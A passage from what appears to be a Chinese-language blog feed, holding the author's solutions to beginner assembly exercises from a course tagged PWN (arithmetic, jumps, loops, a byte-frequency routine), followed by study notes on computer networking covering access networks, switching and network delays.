class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                                                                                                                         </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>19.<strong>条件跳转只能是直接跳转</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>20.折腾了半天, 发现题目描述有错的地方, 这里明明是DWORD, 说成quad word.</p><p>还有一点被我忽略了, 如果按照add eax, ebx的做法, <strong>那么超出四字节的部分会被舍弃</strong> </p><p>这里我想到的做法是用eax取出双字数据, 然后用rax做加法.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #在这里</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>21.硬是没有简化成</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="22-调用"><a href="#22-调用" class="headerlink" title="22.调用"></a>22.调用</h2><p>又是折腾了半天, 主要是逐字节比较的, 从题干也看不出来啊, 孤零零的[src_addr]真就指一个BYTE</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>23.偷懒, 用了别人的代码, 复习操作系统去了</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">;source code:<br>most_common_byte(src_addr, size):<br>    b = 0<br>    i = 0<br>    for i &lt;= size-1:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += 1<br>    b = 0<br><br>    max_freq = 0<br>    max_freq_byte = 0<br>    for b &lt;= 0xff:<br>        if [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    return max_freq_byte<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h1 id="module-4"><a href="#module-4" class="headerlink" title="module 4"></a>module 4</h1><p>基本全在PPT里面, 看就完事了.</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Computer Networking</title>
    <link href="/2022-01/Learning-Computer-Networking/"/>
    <url>/2022-01/Learning-Computer-Networking/</url>
    
    <content type="html"><![CDATA[<p>这里是在寒假期间开始的计网课本笔记, 为了下学期等到老师讲故事的时候能自然的听下去……</p><h2 id="第一章-概论"><a href="#第一章-概论" class="headerlink" title="第一章: 概论"></a>第一章: 概论</h2><blockquote><p>直接复制(来自<a href="https://blog.csdn.net/wwj17647590781/article/details/116896442">这里</a>), 省时间看第八版, 有新的继续补充, 简单的概念罗列不想花时间了, </p></blockquote><h3 id="什么是因特网-两个角度"><a href="#什么是因特网-两个角度" class="headerlink" title="什么是因特网(两个角度)?"></a>什么是因特网(两个角度)?</h3><ul><li><p><strong>（组成角度）</strong> 一种是描述组成它的<strong>软硬件</strong>；</p><ul><li><p><strong>主机/终端：</strong> 所有连入因特网的设备都是主机/终端.</p><ul><li><strong>如何连接？</strong>：端系统通过通信链路和分组交换机连接到一起</li><li><strong>如何接入因特网？:</strong> 端系统通过因特网服务提供商（Internet Service Providers (ISPs)）接入因特网。</li></ul></li><li><p><strong>分组交换机：</strong></p><ul><li><p>最有的分组交换机：<strong>路由器</strong> 、链路交换机 </p></li><li><p>作用：从它的一条入链路接收分组，然后从它的一条出链路转发分组。</p><p>一个分组所经历的一系列通信链路和分组交换机称为通过该网络的<strong>路径route/path</strong>。</p></li><li><p>区别：路由器主要用在<strong>网络核心</strong>，链路层交换机主要用在<strong>接入网</strong>中</p></li></ul></li><li><p><strong>分组：</strong></p><ul><li><strong>组成：</strong> <strong>分组=用户数据段+相应的必要信息</strong>。</li><li><strong>作用：</strong> 端系统之间发送数据时，我们把数据分成一段一段，然后加上必要的信息形成一个一个数据包，这个数据包用术语说叫做分组）（相应的接收端会根据这一个一个数据包，也就是这一个一个分组中的必要信息来获得用户数据段）。</li></ul></li></ul></li><li><p><strong>（功能角度）</strong> 另一种是将其视为为an infrastructure for providing services to distributed applications.</p><ul><li>End systems attached to the Internet provide a <strong>socket interface套接字接口</strong> that specifies how a program running on one end system asks the Internet infrastructure to deliver data to a specific destination program running on another end system.</li><li>就是一堆rules</li></ul></li><li><p><strong>协议：</strong></p><ul><li><strong>定义：</strong> 两个或多个通信实体（不一定是端系统，还有可能是分组交换机等）之间交换信息的格式和次序以及对该信息所采取的动作（通俗来说：描述通信双方交互信息的方式，控制报文发送接受，相当于<strong>合同的约束</strong>）。</li><li><strong>例子：</strong><ul><li>硬件实现的控制协议控制了两块网卡之间的比特流；</li><li>在端系统中，拥塞控制协议控制了发送方和接收方之间传输数据的速率等</li></ul></li></ul></li></ul><h3 id="网络的边缘"><a href="#网络的边缘" class="headerlink" title="网络的边缘"></a>网络的边缘</h3><ul><li><p><strong>端系统：</strong> 与因特网相连的计算机和其它设备，往往处于网络的边缘</p></li><li><p>端系统分类：<strong>客户、服务器</strong> </p><ul><li>客户：通常就是台式电脑，笔记本电脑，手机等</li><li>服务器：一般是用于存储和发布Web页面、中继电子邮件等，属于<strong>大型数据中心</strong>。</li></ul></li><li><p><strong>接入网</strong>：access networks</p><ul><li><p><strong>概念：</strong> 是指将端系统连入到<strong>边缘路由器</strong>的<strong>物理链路</strong> </p></li><li><p><strong>边缘路由器：</strong> 是指端系统到任何其他远程端系统路径上的<strong>第一台路由器.</strong> </p></li><li><p><strong>本地中心局</strong> local central office (CO).</p></li><li><p>家庭接入：<strong>DSL、电缆</strong>、FTTH、==5G Fixed Wireless== </p></li><li><p><strong>digital subscriber line – DSL(数字用户线):</strong> 它的ISP是<strong>本地电话公司</strong>。其使用的通信链路的物理材质为电话线，是一种双绞线。</p><ul><li>用户使用<strong>DSL调制解调器</strong>通过电话线与ISP中的数字用户线接入复用器（<strong>digital subscriber line access multiplexer (DSLAM)<strong>）来交换数据；</strong>家庭DSL调制解调器</strong>将数字数据转换为高频音后通过电话线传输到ISP中心，并且通过<strong>DSL解调器</strong>将DSLAM发送过来的模拟信号转为数字信号<img src="../../image/Computer_Networking/image-20220116215009788.png" alt="image-20220116215009788" style="zoom:50%;" /></li><li><strong>CIC(Cable Internet Access)电缆因特网接入:</strong> 它的ISP是<strong>有线电视公司</strong>。其使用的通信链路的物理材质有<strong>光纤和同轴电缆</strong>，也被称为混合光纤同轴=&gt;<u>hybrid fiber coax (HFC)</u>.<ul><li>用户使用电缆调制解调器通过<strong>同轴电缆与光纤结点</strong>相连，光纤结点通过<strong>光缆与电缆头端相连</strong>，而电缆头端接入了因特网。在<strong>电缆头端</strong>，电缆调制解调器端接系统（<strong>CMTS</strong>, Cable Modem Termination System）起到<strong>DSLAM的作用</strong>，即实现模拟信号和数字信号的转换；<img src="../../image/Computer_Networking/image-20220116215023365.png" alt="image-20220116215023365" style="zoom: 50%;" /></li></ul></li><li><strong>FTTH(Fiber To The Home)光纤到户:</strong> 这里主要是指使用<strong>光纤</strong>作为通信链路的材质。<ul><li>最简单的光纤分布网络称为<strong>直接光纤</strong>，<strong>从本地中心局到每户设置一根光纤</strong>，不过更为一般的是从中心距出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，该光纤才被分成每户一根光纤。 <img src="../../image/Computer_Networking/image-20220116215036114.png" style="zoom:50%;" /></li><li>有两种: active optical networks (AONs) and passive optical networks (PONs) </li><li><strong>optical network terminator (ONT)</strong>, which is connected by dedicated optical fiber to a neighborhood splitter</li><li><strong>optical line terminator (OLT)</strong> providing conversion between optical and electrical signals, connects to the Internet via a telco router</li><li>5G fixed wireless开始被部署, 用到了beam-forming(波束成形) technology, 简单来讲就是将信号波集中在一个方向以节约能量以及提高多用户使用速率. </li></ul></li></ul></li><li><p><strong>企业（和家庭）接入：</strong> <strong>以太网和WIFI</strong></p><ul><li><strong>以太网（是局域网（LAN）中最流行的接入技术）：</strong> 接入是一种在公司、大学、家庭里很流行的接入方式；用户使用双绞线与以太网交换机相连，从而接入因特网；接入以太网交换机的速度可达100Mbps;</li><li>在无线局域网中，无线用户从一个接入点发送和接收数据，而该接入点与企业网相连，企业网最终接入因特网；在无线LAN中，用户需要在一个接入点的几十米范围之内；<img src="../../image/Computer_Networking/image-20220116215053931.png" alt="image-20220116215053931" style="zoom:50%;" /></li><li><strong>广域无线接入：</strong> 在移动设备中，通过蜂窝网提供商运营的基站来发送和接收分组，与WIFI不同的是，用户仅需要位于基站的数万米范围之内即可；</li></ul></li><li><p><strong>Wide-Area Wireless Access: 3G and LTE 4G and 5G</strong> </p><ul><li>nothing special, wait until Chapter 7.</li></ul></li></ul></li><li><p><strong>硬件设备：</strong></p><ul><li><strong>传输媒体</strong>是构成通信链路的主要部分，物理媒体通常可以分为<strong>导引性媒体</strong>和<strong>非导引性媒体</strong><ul><li><strong>导引性媒体：</strong> 信号沿着固体前行</li><li><strong>非导引性媒体中：</strong> 信号沿着固体媒体前行</li></ul></li><li><strong>双绞线twisted-pair：</strong> 最便宜的<strong>引导性</strong>传输媒体，由两条相互螺旋缠绕的铜线组成。是局域网的最佳选择.</li><li><strong>同轴电缆Coaxial cable:</strong> 借助特殊的结构和绝缘层，同轴电缆可得到较高的数据传输速率；在电视系统中应用广泛；同轴电缆可被用作 <strong>引导性</strong>的共享媒体；</li><li><strong>多模光纤缆multimode fiber-optic cable:</strong> 一种可以引导光脉冲的媒体</li><li><strong>陆地无线电频谱terrestrial radio spectrum:</strong> 无线电信道承载电磁频谱中的信号，<strong>不需要物理线路</strong>，提供与移动用户的连接以及长距离承载信号的方式；是一种有吸引力的媒体；</li><li><strong>卫星无线电频谱satellite radio spectrum:</strong> 通过卫星连接两个或多个在地球上的微波发射方（也被称为地面站），该卫星在一个频段上接收信号，在另一个频段上发送信号；种类有同步卫星和近地轨道卫星；</li></ul></li></ul><h3 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h3><ul><li>在考察了因特网边缘之后，开始深入研究网络核心，也就是<strong>互联网端系统的分组交换机和链路构成的网状网格</strong>。Figure 1.10</li><li>通过网络链路和交换机移动数据有两种基本方法：<strong>电路交换和分组交换</strong></li></ul><h4 id="分组交换："><a href="#分组交换：" class="headerlink" title="分组交换："></a>分组交换：</h4><ul><li>分组在通信链路上以<strong>等于该链路的最大传输速率</strong>传输通过通信链路。</li><li><strong>传输时延（应该是传播时延）：</strong> 如果某条链路的最大传输速率为<strong>R比特/秒</strong>，分组长度为<strong>L比特</strong> ，则该链路传输该分组的时间为<strong>L/R秒</strong>。</li><li><strong>存储转发传输：</strong> 存储转发是指交换机在<strong>收到一个完成的分组</strong>，才会向链路输出转发分组，否则就将收到的部分分组缓存起来；因为<strong>缓存等待一个分组的全部数据</strong>而导致的时间开销被称为<strong>存储转发时延</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>缓冲队列</strong>；</li></ul></li><li><strong>排队时延与分组丢失：</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>输出缓存</strong>和，也称为<strong>输出队列</strong>；<strong>缓冲队列的空间有限性</strong>就有可能导致分组交换机无法继续缓存分组（因为链路被占用（该链路正忙于传输其他分组）或者分组还没全部到位）而使到达分组交换机的数据包<strong>被迫丢弃（分组丢失）（丢包）</strong>；这就导致了分组<strong>不但承担了存储转发传输时延，还承担了排队时延</strong>。这些时延是变化的，变化的程度取决于网络的拥塞程度。</li></ul></li><li><strong>转发表与路由选择协议：</strong><ul><li>实际上，分组交换机之所以能够知道往哪去是因为其内部有一个<strong>转发表</strong>，这个表维护了一个IP地址和链路的对应关系，所以处理流程为：<ul><li>通过<strong>分组的必要信息</strong>，获得目的端系统的<strong>IP地址</strong> </li><li>通过<strong>IP地址索引转发表</strong>，从而确定输出链路</li></ul></li></ul></li></ul><h4 id="电路交换："><a href="#电路交换：" class="headerlink" title="电路交换："></a>电路交换：</h4><ul><li><p>在<strong>电路交换网络</strong>中，在端系统通信会话期间，交换机会<strong>预留</strong>端系统间通信路径上的相关资源（缓存，链路传输速率），即<strong>先建立连接，然后通信</strong>；而在<strong>分组交换网络中，这些资源没有被预留</strong>；也就是说，在端系统进行通信时，其所需要的资源是<strong>被保持</strong>的，其他通信是无法使用这一部分资源的；也就说，端系统间真正建立了一条“连接”；而这一连接，用电话的术语被称为“电路”。传统的电话网络就是电路交换网络的例子。</p></li><li><p>电路交换网络中的复用：</p><ul><li><strong>时分复用（Time-Division Multiplexing TDM）：</strong> 是指将时间划分为<strong>固定区间的帧</strong>，每个帧则又被划分为固定数量的<strong>时间空隙</strong>；当网络需要建立一条连接时，网络将在每个帧中为该连接指定一个时隙；在该时隙内，链路用来传输该链接的数据；</li><li><strong>频分复用(Frequency-Division Multiplexing)：</strong> 将频率域划分为频段，然后将<strong>频段</strong>分配给连接；此频段被用来专门传输链接的数据。该频段的宽度成为带宽。</li></ul></li><li><p><strong>分组交换和电路交换的对比：</strong></p><ul><li><strong>分组交换的优点：</strong><ul><li>它提供了比电路交换更好的带宽共享；</li><li>它比电路交换更简单、更有效、实现成本更低；</li></ul></li><li><strong>分组交换的缺点:</strong><ul><li>分组交换<strong>不适合实时服务</strong>，因为端到端的<strong>时延是可变、不可预测的</strong>，这和整个网络的情况相关；</li></ul></li><li><strong>电路交换的优点：</strong><ul><li>提供了端对端传输数据的速率保证；</li></ul></li><li><strong>电路交换的缺点</strong>：<ul><li>电路交换存在静默期，这是指专用电路空闲时，其占用的资源并没有得到充分的利用；</li><li>建立连接的过程比较复杂；</li></ul></li><li><strong>总结：</strong> 总体上来说，<strong>分组交换的性能要好于电路交换的性能</strong>，但是不同类型的分组交换方式有不同的应用场景；比如一些对最低速率有着严格要求的应用，比如实时服务等，为了获得速率保证，牺牲网络的效率也是可以接受的。趋势向着分组交换发展网络的网络</li></ul></li></ul><h4 id="网络的网络："><a href="#网络的网络：" class="headerlink" title="网络的网络："></a>网络的网络：</h4><ul><li><p>该用什么样的结构来刻画因特网呢？<strong>因特网</strong>是网络的网络</p></li><li><p>通过5个模型不断过渡到最终模型，其实过渡的过程就结构不断合理、连接方式不断明确的过程</p></li><li><p>端系统是通过<strong>ISP接入因特网</strong>的，<strong>为了实现端系统的互联，ISP也必须互联</strong>，其实网络模型就是用来<strong>表达ISP和端系统以及ISP之间的结构的抽象。</strong></p></li><li><p><strong>网络结构1：</strong> <strong>存在唯一的全球传输ISP互联所有的接入ISP</strong>，这是指，全球ISP是一个由路由器和通信链路构成的网络，该网络跨越全球，并且其他的接入ISP都至少和一个它的路由器相连（<strong>接入ISP被认为是客户</strong>，<strong>全球传输被认为是提供商</strong>）；</p></li><li><p><strong>网络结构2：</strong> <strong>存在多个全球传输ISP</strong>，它们分别于一部分的接入ISP互联；为了实现端系统的互联，这多个全球ISP也必须互联；网络结构是一个两层结构，其中<strong>全球传输ISP位于顶层</strong>，<strong>接入ISP处于底层</strong>；</p></li><li><p><strong>网络结构3：</strong> <strong>顶层全球传输ISP基本上已经定型</strong>，但是接入ISP现在还很混乱，比如，它们直接同顶层ISP相连；而网络结构3中，<strong>接入ISP也是分层的</strong>：较小区域中的ISP连入较大区域的ISP，而不是直接与顶层ISP相连；为什么会出现这样的结构呢？这是因为，如果都直接同顶层ISP相连，那么两个同一较小区域内，分属不同ISP的端系统之间通信的数据也会到顶层ISP中心去一趟，如果它们不是直接接入顶层ISP，而是接入了一个较大区域的ISP，那么它们之间的通信数据就不用去顶层ISP中心了，因为它们通过较大区域的ISP已经实现了互连，所以通信速度肯定就上去了。</p></li><li><p><strong>网络结构4</strong>: 是在网络结构3的基础上，增加了以下特点而形成的结构：<strong>存在点</strong>（Point of Presence，<strong>PoP</strong>）、<strong>多宿</strong>、<strong>对等</strong>、<strong>因特网交换点</strong>（Internet exchange point，<strong>IXP</strong>）。</p><ul><li><strong>PoP：</strong> 存在于等级结构中所有层次，但是底层ISP除外；<strong>一个PoP是ISP网络中的一台或者多台路由器群组</strong>，其中客户ISP能够通过第三方<strong>提供的高速链路直接将它的路由器和供应商的PoP连接</strong>，从而实现与提供商ISP连接。这样接入速度很明显就提高了。</li><li><strong>多宿（multi-home）：</strong> 任何ISP（除第一层ISP）都可以与<strong>两个或者多个提供商ISP连接</strong>，这被称为<strong>多宿</strong>；这样网络的<strong>可靠性</strong>就提高了。</li><li><strong>对等（peer）：</strong> 位于<strong>相同等级结构层次的一对邻近ISP能够直接将它们的网络连接到一起</strong>，使它们之间流量经直接连接而不<strong>是经过上游的中间ISP传输</strong>，这样既不用付费，速度也可能会快一些</li><li><strong>IXP：</strong> 因特网交换点是为了实现多个ISP<strong>可以对等</strong>而创建的。</li></ul></li><li><p><strong>网络结构5：</strong> 网络结构5是在网络结构4的基础上<strong>增加了内容提供商网络</strong>而构成。内容提供商构建自己的网络，并且<strong>通过与较低层ISP对等而“绕过”较高层因特网ISP</strong>，而且内容提供商对端用户也有了更多的控制。</p><img src="../../image/Computer_Networking/image-20220116215250646.png" alt="image-20220116215250646" style="zoom:67%;" /></li><li><p>总体来说，今天的因特网是一个“网络的网络”，其结构复杂，由十多个顶层ISP和数十万个较低层ISP构成。近年来，<strong>主要的内容提供商创建自己的网络，直接在可能的地方与较低层ISP互联.</strong></p></li></ul><h3 id="分组交换中的时延、丢包、吞吐量"><a href="#分组交换中的时延、丢包、吞吐量" class="headerlink" title="分组交换中的时延、丢包、吞吐量:"></a>分组交换中的时延、丢包、吞吐量:</h3><ul><li><p>因特网能够看成是一种基础设施，该基础设施为运行在端系统上的分布式应用提供服务。</p></li><li><p><strong>理想目标</strong>：因特网能够在任意两个端系统之间随心所欲地移动数据而没有任何数据丢失，<strong>计算机网络必定要限制在端系统之间的吞吐量（每秒能够传输的数据量），在端系统之间引入时延，而且实际上也会丢失分组</strong></p></li></ul><h4 id="分组交换网中的时延概述："><a href="#分组交换网中的时延概述：" class="headerlink" title="分组交换网中的时延概述："></a>分组交换网中的时延概述：</h4><ul><li>一个分组在沿途每个节点<strong>承受不同类型的时延</strong>，这些时延中最为重要的是：结点<strong>处理时延、排队时延、传输时延</strong>和<strong>传播时延</strong>.这些时延总体累加起来是<strong>结点总时延</strong></li><li><strong>节点总时延==结点处理时延+排队时延+传输时延+传播时延</strong></li><li><strong>时延类型：</strong><ul><li><strong>节点处理时延nodal processing delay：</strong> 是因为节点需要解析分组的必要信息然后决定是哪个出链路（索引转发表等操作）而产生的，通常在微秒或者更低数量级；</li><li><strong>排队时延queuing delay：</strong> 是因为分组所对应的出链路前面有其他分组正在传输，所以分组需要该链路的缓冲队列里等待其他分组传输完毕而产生的，一个特定分组的排队时延长度将取决于先前到达的正在排队等待向链路传输的分组数量。排队时延是到达该队列的流量强度和性质的函数，通常可以达到毫秒级到微秒级；</li><li><strong>传输时延transmission delay(一个分组的节点全部进入链路的时延)：</strong> 传输时延是将<strong>所有分组的比特推向链路所有需要的时间</strong>，实际的传输时延通常在毫秒到微秒数量级。用L表示分组的长度，用Rbps表示从路由器A到B的链路传输速率。传输时延是L/R。</li><li><strong>传播时延propagation delay(链路中消耗的)：</strong> 是指<strong>比特进入链路后，从该链路的起点到下一个结点所用的时间</strong>；一旦分组中的最后一个比特到达路由器就意味着该分组的所有比特都已到达路由器；广域网中，传播时延一般是毫秒级的。<strong>传播时延是d/s</strong>。d是路由器A到B的距离。s是链路的传播速率。</li></ul></li><li>传输时延和传播时延的对比：<ul><li>传输时延：大卡车经过收费站的时间（分组长度L <strong>/</strong> 链路的传输速率）</li><li>传播时延：大卡车在高速上行驶的时间（两台路由器之间的链路长度d <strong>/</strong> 两台路由器之间的传输速率）</li></ul></li></ul><h4 id="排队时延和丢包："><a href="#排队时延和丢包：" class="headerlink" title="排队时延和丢包："></a>排队时延和丢包：</h4><ul><li>丢包Packet Loss：到达的分组发现一个满的队列。由于没有地方存储这个分组，路由器将丢弃该分组，该分组将会丢失。<ul><li>排队时延和丢包与网络的状况和结点的缓冲空间大小、处理速度相关；</li><li>如果分组到达的速度 <strong>&gt;</strong> 结点的处理速度，那么分组就会在缓冲队列里排队等待。</li><li>为了描述网络状态，我们引入了<strong>流量强度traffic intensity</strong>这一概念：<strong>流量强度=分组到达的速度 / 结点的处理速度</strong>；</li><li>流量工程里一个金科玉律就是：设计系统时<strong>流量强度&lt;=1</strong>，流量强度持续大于1时，就将出现<strong>丢包</strong>现象</li></ul></li></ul><h4 id="端到端时延："><a href="#端到端时延：" class="headerlink" title="端到端时延："></a>端到端时延：</h4><ul><li><strong>端到端时延 ==(节点总时延 * (路由器个数+1) )== （结点处理时延+排队时延+传输时延+传播时延）*（路由器个数+1）</strong></li></ul><h4 id="计算机网络的吞吐量："><a 